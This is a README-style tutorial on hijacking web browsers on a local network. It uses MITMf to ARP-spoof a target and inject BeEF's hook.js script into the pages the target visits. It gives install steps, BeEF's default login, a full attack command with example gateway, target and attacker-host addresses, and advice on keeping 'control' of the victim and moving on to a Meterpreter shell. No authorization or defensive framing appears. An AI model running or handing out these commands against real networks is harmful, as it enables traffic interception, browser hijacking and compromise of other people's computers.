# Hooking-Web-Browsers-with-MITMf-and-BeEF

Requirements
  1. MITMf
      To install:
        > apt-get install mitmf
          or
        > git clone https://github.com/byt3bl33d3r/MITMf
  
  2. BeEF 
  
Step 1
  - Start BeEF
  - Open a new terminal and type cd /usr/share/beef-xss/
  - If BeEF is installed, go ahead and run it by typing ./beef
  - If you were able to see the Hook URL remember or copy the URL provided.

Step 2
  - Open the Panel. Now you can open the BeEF web panel with the UI URL provided from step 1. 
    Once presented with the login page, you should just be able to get in with the default credentials "beef" for both the username and       password.
 
 Step 3
  - Inject the Hook.js Script.
    Open up a new terminal. We'll be using MITMf to inject the hooking script. 
    Use mitmf --spoof --arp -i <interface> --gateway <router IP> --target <target IP> --inject --js-url <hook.js URL> as the format.
      --spoof loads the spoof plugin
      --arp redirects ARP packets
      -i specifies the interface to inject packets on
      --gateway sets the IP of your router to redirect through
      --target sets the target IP to inject the hook.js script
      --inject loads the inject function
      --js-url specifies the JavaScript code to inject
  
    Run the command and MITMf should start giving you some output. 
    For example:
     root@kali:~# mitmf --spoof --arp -i wlan0 --gateway 10.10.10.1 --target 10.10.10.50 --inject --js-url http://10.10.10.40:3000/hook.js
    
    If successful, MITMf will let us know that it successfully injected the hook.js script into the websites that the target visited.
 
 Step 4
  - Back to BeEF.
    If we check our BeEF panel, you will see the hooked computer right on the Online Browsers tab.
      P.S: You don't have to worry about the victim having to stay on the webpage for you to have control of it. MITMf will continue                injecting the script into every website the victim visits, so you'll never lose control!
    From here, you can continue trying to exploit the victim machine, and maybe get a Meterpreter prompt!
    
NOTE: This only works with non-HSTS websites. You could try the --hsts function, but it might make things too slow and/or glitchy.
